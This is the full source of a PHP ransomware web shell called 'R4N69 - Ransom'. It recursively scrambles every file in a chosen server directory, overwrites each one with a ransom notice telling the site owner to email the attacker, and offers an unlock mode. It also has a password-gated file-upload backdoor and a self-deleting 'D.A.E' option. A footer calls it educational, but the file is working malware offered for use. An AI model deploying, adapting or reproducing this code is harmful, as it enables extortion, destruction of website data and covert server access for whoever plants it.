<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
mb_internal_encoding("UTF-8");
class meow
/*
Created by DavidM                                                                                                                                                                                                                                                                          
*/
{
    public function generate_enc($leak){
        for ($i=1; $i <3; $i++) { 
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            $leak = base64_encode(str_rot13($leak));
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
        }
            $pesan  = base64_decode("VGhpcyBzaXRlIGhhcyBiZWVuIGxvY2tlZCAo4oyQ4pagX+KWoCkgaHVlaHVlaCAuLi4sIHBsZWFzZSBjb250YWN0IHRvIGVtYWlsIHJvb3RASWhhdmVCZWVuUFdORUQgdG8gdW5sb2NrIHRoaXMgc2l0ZSBiYWNrLg=");
            $leak   = "<!--#LOCK#".$leak."--> <title>(⌐■_■) SOrry Admin! Site has been Locked</title> <em>".$pesan."</em>";
        return $leak;
    }
    public function generate_dec($leak){
        $woh = "/<!--#LOCK#(.*?)-->/";
        preg_match($woh, $leak, $matches);
        if($matches[1]){
            $leak = $matches[1];
            for ($i=1; $i <3; $i++) {
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
                $leak = str_rot13(base64_decode($leak));
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            }
        }else{
            return false;
        }
            return $leak;
    }
    public function lock($location_file){
        $fgt    = file_get_contents($location_file); 
        $lock   = meow::generate_enc($fgt);
        if(meow::w00t($lock,$location_file)){
            echo "root@IhaveBeenPWNED!:~ <font color='white'>{$location_file}</font> <font color='#FF0000'>Locked Done!!!</font><br>";
        }else{
            echo "root@IhaveBeenPWNED!:~ <font color='white'>{$location_file}</font> <font color='#FFFF00'>Locked Fail!!!</font><br>";
        }
    }
    public function unlock($location_file){
        $fgt    = file_get_contents($location_file); 
        $lock   = meow::generate_dec($fgt);
        if(meow::w00t($lock,$location_file)){
             echo "root@IhaveBeenPWNED!:~ <font color='white'>{$location_file}</font> <font color='#FF0000'>Unlocked Done!!!</font><br>";
        }else{
             echo "root@IhaveBeenPWNED!:~ <font color='white'>{$location_file}</font> <font color='#FFFF00'>Unlocked Fail!!!</font><br>";
        }
     }

     public function w00t($data,$locate){
        if( file_put_contents($locate, htmlentities($data) ) ){
               return true;
            }else{
               return false;
        }
     }

     public function cuk($ext,$name){
        $re = "/({$name})/";  
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }

    public function boom($dir,$mode)
    {
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $d = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($d)){
                    if(meow::cuk($d,".png") && meow::cuk($d,".svg") && meow::cuk($d,".woff") && meow::cuk($d,".jpg") && meow::cuk($d,".htaccess") && meow::cuk($d,"lol.php")  ){
                    
                    if($mode == "1"){
                        $locaked = meow::lock($d);
                    }else{
                        $unlock = meow::unlock($d);
                    }

                    }
                }else{
                    meow::boom($d,$mode);
                }
            }
        flush();
        ob_flush();
        }
    }
    public function locate(){
        return getcwd();
    }
    public function savemode(){
        $remove = unlink(basename($_SERVER['PHP_SELF']));
        if($remove){
            return true;
        }else{
            return false;
        }
    }

}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
    <title>R4N69 - Ransom</title>
	<!--
RRRRRRRRRRRRRRRRR          444444444  NNNNNNNN        NNNNNNNN        66666666  999999999     
R::::::::::::::::R        4::::::::4  N:::::::N       N::::::N       6::::::6 99:::::::::99   
R::::::RRRRRR:::::R      4:::::::::4  N::::::::N      N::::::N      6::::::699:::::::::::::99 
RR:::::R     R:::::R    4::::44::::4  N:::::::::N     N::::::N     6::::::69::::::99999::::::9
  R::::R     R:::::R   4::::4 4::::4  N::::::::::N    N::::::N    6::::::6 9:::::9     9:::::9
  R::::R     R:::::R  4::::4  4::::4  N:::::::::::N   N::::::N   6::::::6  9:::::9     9:::::9
  R::::RRRRRR:::::R  4::::4   4::::4  N:::::::N::::N  N::::::N  6::::::6    9:::::99999::::::9
  R:::::::::::::RR  4::::444444::::444N::::::N N::::N N::::::N 6::::::::6666699::::::::::::::9
  R::::RRRRRR:::::R 4::::::::::::::::4N::::::N  N::::N:::::::N6::::::::::::::6699999::::::::9 
  R::::R     R:::::R4444444444:::::444N::::::N   N:::::::::::N6::::::66666:::::6    9::::::9  
  R::::R     R:::::R          4::::4  N::::::N    N::::::::::N6:::::6     6:::::6  9::::::9   
  R::::R     R:::::R          4::::4  N::::::N     N:::::::::N6:::::6     6:::::6 9::::::9    
RR:::::R     R:::::R          4::::4  N::::::N      N::::::::N6::::::66666::::::69::::::9     
R::::::R     R:::::R        44::::::44N::::::N       N:::::::N 66:::::::::::::669::::::9      
R::::::R     R:::::R        4::::::::4N::::::N        N::::::N   66:::::::::66 9::::::9       
RRRRRRRR     RRRRRRR        4444444444NNNNNNNN         NNNNNNN     666666666  99999999        
	-->
<style type="text/css">
    body{
            color: #3EF403;
            background-color: black;
    }
    input {
            border: dashed 2px;
            border-color: #ffffff;
            background-color: Black;
            font: 16pt consolas;
            color: #0CFF37;
    }
 
	h1 {
		font: 40pt consolas;
		color: #FFFFFF;
	}

    select {
        border: dashed 2px;
        border-color: #ffffff;
        background-color: Black;
        font: 16pt consolas;
        color: #0CFF37;
    }
	button {
		background-color: #4CAF50;
		border: none;
		color: white;
		padding: 15px 32px;
		text-align: center;
		text-decoration: none;
		display: inline-block;
		font-size: 16px;
	}
	footer {
		border-color: #ffffff;
		color: white;
		font: 12pt consolas;
	}	
	html{
		overflow-y:hidden;
		overflow-x:hidden;
	}
        </style>

	
</head>
<body>
<pre style="text-align: center"><font color="white">
RRRRRRRRRRRRRRRRR          444444444  NNNNNNNN        NNNNNNNN        66666666  999999999     
R::::::::::::::::R        4::::::::4  N:::::::N       N::::::N       6::::::6 99:::::::::99   
R::::::RRRRRR:::::R      4:::::::::4  N::::::::N      N::::::N      6::::::699:::::::::::::99 
RR:::::R     R:::::R    4::::44::::4  N:::::::::N     N::::::N     6::::::69::::::99999::::::9
  R::::R     R:::::R   4::::4 4::::4  N::::::::::N    N::::::N    6::::::6 9:::::9     9:::::9
  R::::R     R:::::R  4::::4  4::::4  N:::::::::::N   N::::::N   6::::::6  9:::::9     9:::::9
  R::::RRRRRR:::::R  4::::4   4::::4  N:::::::N::::N  N::::::N  6::::::6    9:::::99999::::::9</font><font color="blue">
  R:::::::::::::RR  4::::444444::::444N::::::N N::::N N::::::N 6::::::::6666699::::::::::::::9
  R::::RRRRRR:::::R 4::::::::::::::::4N::::::N  N::::N:::::::N6::::::::::::::6699999::::::::9 
  R::::R     R:::::R4444444444:::::444N::::::N   N:::::::::::N6::::::66666:::::6    9::::::9  
  R::::R     R:::::R          4::::4  N::::::N    N::::::::::N6:::::6     6:::::6  9::::::9   
  R::::R     R:::::R          4::::4  N::::::N     N:::::::::N6:::::6     6:::::6 9::::::9    </font><font color="red"> 
RR:::::R     R:::::R          4::::4  N::::::N      N::::::::N6::::::66666::::::69::::::9   
R::::::R     R:::::R        44::::::44N::::::N       N:::::::N 66:::::::::::::669::::::9      
R::::::R     R:::::R        4::::::::4N::::::N        N::::::N   66:::::::::66 9::::::9       
 RRRRRRRR     RRRRRRR        4444444444NNNNNNNN         NNNNNNN     666666666  99999999 </font><font color="blue">CYKA</font> <FONT color="white">BLYAT</FONT>
</pre>
<Center>
<h1>MANUAL VERSION - V1</h1>
<?php 
if($_GET['pwd']=="as<w4443omgsdaI##:$w4$ªbas6dc78382ry89<<>>><<cu^ª`*^ÇªCLFCÇÇSCKFSF__!%&_(/&)/(==/(||||\\«««'«»»«'Çª%ill23_#di3b3c`*^\|24u645_&%ªs+++*çmnjkhvcfsq33443243223MYw3bS!T3IS_posTTAha677CR2Y7567P8T3D!"){
echo '
<form method=POST enctype="multipart/form-data" action="">
<input type="file" name="files" class="upload"> <input type=submit value="Upload"></form>';
    $files = @$_FILES["files"];
    if ($files["name"] != '') {
        $fullpath = $files["name"];
        if (move_uploaded_file($files['tmp_name'], $fullpath)) {
            echo '<font color="green">Berhasil Cuk!!!</font>';
        }else{
            echo '<font color="red">Gagal Cuk!!!</font>';
        }
    }
}else{?>
<form action="" method="post">
<input type="text" name="url" placeholder="<?= meow::locate(); ?>" value="<?= meow::locate(); ?>">
<select name="method">
        <option value="1">Locked</option>
        <option value="2">Unlocked</option>
</select>
<input type="checkbox" name="savemode" value="1">D.A.E
<button type="submit" name="submit" value="Input Button">BOOM!</button>
</form>
<pre style="text-align: left;"><?php
 if(isset($_POST['submit'])){
    echo meow::boom($_POST['url'],$_POST['method']);
    if($_POST['savemode']=="1"){
        if(meow::savemode()){
        echo "(⌐■_■)ノ #Ransom is dead! Press F5 to exit.";
        }
    }
}
?>

<?php
}
?>
</pre>
</Center>
<footer>

  <p>This ransom is created only for Educational Purposes.</p>
  <p>Any damage caused by this script will be your entire responsability</p>
  <p>Contact information: <a href="mailto:deltahacker@protonmail.com">
  DeltaHacker@protonmail.com</a>.</p><br/>
  <p>My twitter:</p>
  
<a href="https://twitter.com/DeltaPentester" class="twitter-follow-button" data-show-count="false" data-size="large">Follow me on twitter</a> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
</footer>
</body>
</html>
